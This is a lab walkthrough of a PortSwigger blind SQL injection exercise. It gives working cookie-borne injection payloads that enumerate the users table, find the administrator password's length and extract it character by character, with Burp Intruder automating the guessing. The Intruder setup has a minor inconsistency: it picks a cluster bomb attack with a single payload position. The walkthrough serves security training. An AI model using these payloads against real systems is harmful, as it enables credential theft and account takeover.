# 💀 Lab Walkthrough: Blind SQL Injection with Conditional Responses – Stealing Administrator Password
## 🧪 LAB SETUP

- URL: [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
- Vulnerability: Blind SQL injection via `TrackingId` cookie
- Goal: Log in as `administrator`
- Technique: **Blind SQL injection with conditional responses**
- Tool used: **Burp Suite**

## 🔍 Step 1: Confirm SQLi Vulnerability Exists

### 📥 Request:
```http
GET / HTTP/1.1
Host: your-lab-url.com
Cookie: TrackingId=ZHWKDa1jPXivi6Y5
```

### 💡 Observation:
You see a **"Welcome back" message** → This indicates the query returned at least one row.

Now try:

### 📥 Request:
```http
GET / HTTP/1.1
Host: your-lab-url.com
Cookie: TrackingId=ZHWKDa1jPXivi6Y6
```

### 💡 Observation:
No "Welcome back" message → Query returned no rows.

👉 **Conclusion**: The application behaves differently based on SQL query results → **Blind SQL injection is possible** ✅

## ⚙️ Step 2: Test Basic Boolean Logic

Try injecting a simple `AND 1=1` condition:

### 📥 Cookie:
```http
Cookie: TrackingId=ZHWKDa1jPXivi6Y5' AND 1=1--
```

### 💡 Result: Welcome back appears ✅  
✅ The condition evaluated to TRUE.

Try again with `AND 1=2`:

### 📥 Cookie:
```http
Cookie: TrackingId=ZHWKDa1jPXivi6Y5' AND 1=2--
```

### 💡 Result: No welcome back ❌  
✅ The condition evaluated to FALSE.

🎯 **This confirms we can control the logic of the SQL query** — we now have a way to ask TRUE/FALSE questions.

## 🗃️ Step 3: Check if `users` Table Exists

We know from the lab description there’s a `users` table, but let's verify it exists using a subquery.

### 📥 Cookie:
```http
Cookie: TrackingId=ZHWKDa1jPXivi6Y5' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

### 🔍 Breakdown:

| Part | Meaning |
|------|---------|
| `'` | Closes the original string input |
| `AND` | Ensures both sides must be true for the whole expression to be true |
| `(SELECT 'x' FROM users LIMIT 1)` | Returns `'x'` if at least one row exists in `users` |
| `='x'` | Compares result to `'x'` — returns TRUE or FALSE |
| `LIMIT 1` | Prevents multiple-row error |
| `--` | Comments out any remaining SQL |

### 💡 Result: Welcome back appears ✅  
➡️ The `users` table exists.

## 👤 Step 4: Check if `administrator` User Exists

Let’s confirm the `administrator` user exists.

### 📥 Cookie:
```http
Cookie: TrackingId=ZHWKDa1jPXivi6Y5' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```

### 🔍 Breakdown:

| Part | Meaning |
|------|---------|
| `SELECT username...WHERE username='administrator'` | Tries to get the username |
| `='administrator'` | Checks if it equals `'administrator'` |
| If true → welcome message shows ✅ |

### 💡 Result: Welcome back appears ✅  
➡️ The `administrator` user exists.

## 🔐 Step 5: Find Length of Administrator Password

Next step: find the length of the password.

### 📥 Cookie:
```http
Cookie: TrackingId=ZHWKDa1jPXivi6Y5' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 20 --
```

Wait… That didn't return a welcome message. Try smaller numbers.

Eventually, you'll find:

### 📥 Cookie:
```http
Cookie: TrackingId=ZHWKDa1jPXivi6Y5' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = 20 --
```

### 💡 Result: Welcome back appears ✅  
➡️ The password has **20 characters**.

## 🧬 Step 6: Extract Password Using Substring + Brute Force

Now we extract the password character by character using `SUBSTRING`.

### 📥 Cookie:
```http
Cookie: TrackingId=ZHWKDa1jPXivi6Y5' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

If the first letter is `'a'`, welcome message appears. If not, it doesn’t.

🔁 We need to test all possible values for each position (from 1 to 20).

## 🕵️‍♂️ Step 7: Use Burp Intruder to Automate Extraction

### Steps in Burp Suite:
1. Send request to **Intruder**
2. Go to **Positions**
3. Select the `'a'` part in the payload position → click "Add §"
4. Go to **Payloads**
5. Set payload type to **Simple list**
6. Add all possible characters: `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`
7. Attack type: **Cluster bomb**
8. Start attack

Each combination will send a new request with a different character in the selected position.

## 📊 Step 8: Analyze Responses

After the attack finishes:

- Look for which requests show the **"Welcome back"** message.
- Sort by **length** or use filters like `"Set-Cookie"` or content-length difference.
- For each position (1–20), find the matching character.

Example:
- Position 1 → `'W'` gives welcome
- Position 2 → `'e'` gives welcome
- ...
- Finally: You reconstruct the full password.

## 🎯 Step 9: Log In as Administrator

Once you've extracted the full password (e.g., `WElcOmeT0Th3P@ssw0rd!`), go to `/login` and log in as:

- **Username:** `administrator`
- **Password:** `WElcOmeT0Th3P@ssw0rd!` (**Not actual password**)

🔐 **Lab Solved!**


### 🧾 Summary: All Queries Explained

| Query | Purpose |
|-------|---------|
| `' AND 1=1--` | Test if injection works 🧪 
| `' AND 1=2--` | Test false condition ❌|
| `(SELECT 'x' FROM users LIMIT 1)='x'` | Check if `users` table exists 🗃️ |
| `(SELECT username FROM users WHERE username='administrator')='administrator'` | Check if admin user exists  👤 |
| `LENGTH(password)=20` | Determine password length  🔐 |
| `SUBSTRING(password,1,1)='a'` | Extract password character by character 🧬 |
| Burp Intruder + payloads | Automate extraction of all chars  🕵️‍♂️ |

### 🧠 Final Notes

- **Blind SQL Injection** relies on observing **behavioral differences** (like presence of text).
- Always start with basic tests (`1=1`, `1=2`) before moving deeper.
- Use `LIMIT 1` to avoid multi-row errors.
- Use `AND` to force strict conditions.
- Use tools like **Burp Intruder** to automate brute-force steps.

### 🏁 Congratulations!

You’ve successfully exploited a **Blind SQL Injection vulnerability**, extracted a password, and logged in as the **administrator**. 🎉
